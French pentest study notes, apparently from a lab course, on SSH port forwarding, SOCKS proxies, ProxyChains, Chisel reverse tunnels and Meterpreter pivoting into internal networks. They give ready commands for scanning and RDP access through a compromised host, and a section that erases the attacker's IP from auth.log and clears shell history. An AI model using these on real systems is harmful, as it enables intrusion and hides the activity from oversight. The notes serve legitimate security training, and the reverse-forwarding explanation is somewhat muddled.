Voici une représentation du flux de données pour une chaîne d'attaque par redirection de port :

```mermaid
flowchart LR
    A[Attaquant] -- SSH Tunnel --> B[Pivot (Ubuntu)]
    B -- Accès Réseau --> C[Cible Interne]
```

## Introduction à la Redirection de Ports

La redirection de ports permet de transférer une connexion d'un port à un autre. Elle est utilisée pour contourner les pare-feu, accéder à des services internes, effectuer du **pivoting** pour se déplacer latéralement dans un réseau et exécuter des exploits sur des services non exposés.

### Types de Redirection de Ports

*   **Redirection de port locale (-L)** : Transfère un port local vers un port distant.
*   **Redirection dynamique (-D)** : Crée un proxy **SOCKS** pour pivoter sur tout un réseau.

> [!warning] Prérequis
> Nécessite un accès SSH valide (clé privée ou mot de passe) sur la machine pivot.

## Redirection de Port Locale (SSH -L)

### Scénario
Accès au service **MySQL** (port 3306) d'un serveur Ubuntu (`10.129.202.64`) inaccessible depuis l'extérieur.

### Commande
```bash
ssh -L 1234:localhost:3306 ubuntu@10.129.202.64
```

L'option **-L 1234:localhost:3306** redirige le port 1234 de la machine locale vers le port 3306 du serveur distant.

### Vérification
```bash
netstat -antp | grep 1234
nmap -sV -p 1234 localhost
```

## Reverse Port Forwarding (SSH -R)

Utilisé lorsque la machine cible ne peut pas initier de connexion sortante vers l'attaquant, mais que l'attaquant peut se connecter à la cible. Le port est ouvert sur la machine de l'attaquant et redirigé vers la cible.

### Commande
```bash
ssh -R 8080:localhost:80 attacker@10.10.14.5
```
Ici, le port 8080 sur la machine de l'attaquant est redirigé vers le port 80 de la machine distante.

## Redirection Dynamique (SSH -D)

### Scénario
Accès à un réseau interne (`172.16.5.0/23`) via un serveur Ubuntu (`10.129.202.64`) compromis.

### Commande
```bash
ssh -D 9050 ubuntu@10.129.202.64
```

L'option **-D 9050** crée un proxy **SOCKS** sur le port 9050. Tout le trafic envoyé via ce port est redirigé à travers le serveur Ubuntu vers le réseau privé.

> [!tip] Astuce
> Utiliser **Chisel** pour des tunnels plus robustes si SSH n'est pas disponible ou instable.

## Gestion des sessions SSH (tmux/screen)

Pour maintenir les tunnels actifs lors d'une déconnexion de la session terminal, utilisez **tmux**.

```bash
tmux new -s pivot
ssh -D 9050 user@target
# Détacher avec Ctrl+b puis d
# Rattacher avec :
tmux attach -t pivot
```

## Configuration de ProxyChains

Ajout de la configuration dans **/etc/proxychains.conf** :

```bash
echo 'socks4 127.0.0.1 9050' >> /etc/proxychains.conf
```

Il est nécessaire de désactiver `proxy_dns` dans le fichier de configuration en ajoutant un `#` devant la ligne.

> [!danger] Attention
> Le scan via **proxychains** est extrêmement lent car il utilise le TCP connect scan (**-sT**).

> [!danger] Danger
> La modification répétée de `/etc/proxychains.conf` peut créer des conflits de routage.

## Exploitation via ProxyChains

### Scan réseau
```bash
proxychains nmap -sT -Pn -p- 172.16.5.19
```

### Connexion RDP
```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Utilisation de Metasploit
```bash
proxychains msfconsole
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 172.16.5.19
run
```

## Techniques de pivoting via Meterpreter/Chisel

Lorsque SSH est restreint, **Chisel** est l'outil de choix pour créer des tunnels HTTP/S robustes.

### Chisel (Reverse Tunnel)
Attaquant :
```bash
./chisel server -p 8000 --reverse
```
Cible :
```bash
./chisel client 10.10.14.5:8000 R:socks
```

### Meterpreter (Autoroute)
```bash
meterpreter > portfwd add -l 3306 -p 3306 -r 172.16.5.19
```
Voir les notes sur **Pivoting** et **Post-Exploitation**.

## Pivoting Avancé (Multi-Hop)

Pour atteindre un réseau (`192.168.1.0/24`) situé derrière une machine pivot (`172.16.5.19`) :

1. Ouverture d'un nouveau proxy SOCKS :
```bash
ssh -D 9051 ubuntu@172.16.5.19
```

2. Ajout de la configuration dans **/etc/proxychains.conf** :
```bash
echo 'socks4 127.0.0.1 9051' >> /etc/proxychains.conf
```

3. Scan du réseau cible :
```bash
proxychains nmap -sT -Pn -p- 192.168.1.50
```

## Gestion des timeouts et instabilité du réseau

Les tunnels SSH peuvent se fermer en cas d'inactivité.

```bash
# Ajouter au fichier ~/.ssh/config
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3
```

## Nettoyage des traces (logs SSH)

Les connexions SSH laissent des traces dans `/var/log/auth.log` ou `journalctl`.

```bash
# Supprimer les entrées spécifiques de l'historique
sed -i '/10.10.14.5/d' /var/log/auth.log
# Effacer l'historique bash
history -c && history -w
```

## Récapitulatif des commandes

| Action | Commande |
| :--- | :--- |
| Redirection de port local | `ssh -L local_port:localhost:remote_port user@host` |
| Proxy SOCKS pour pivoting | `ssh -D local_port user@host` |
| Configurer ProxyChains | `echo 'socks4 127.0.0.1 9050' >> /etc/proxychains.conf` |
| Scanner via ProxyChains | `proxychains nmap -sT -Pn -p- target` |
| Exploiter avec Metasploit | `proxychains msfconsole` |
| Connexion RDP avec ProxyChains | `proxychains xfreerdp /v:target /u:user /p:pass` |
| Pivot Multi-Hop | `ssh -D 9051 user@intermediate_host` |

### Liens associés
- **Pivoting**
- **SSH Tunneling**
- **Network Enumeration**
- **Post-Exploitation**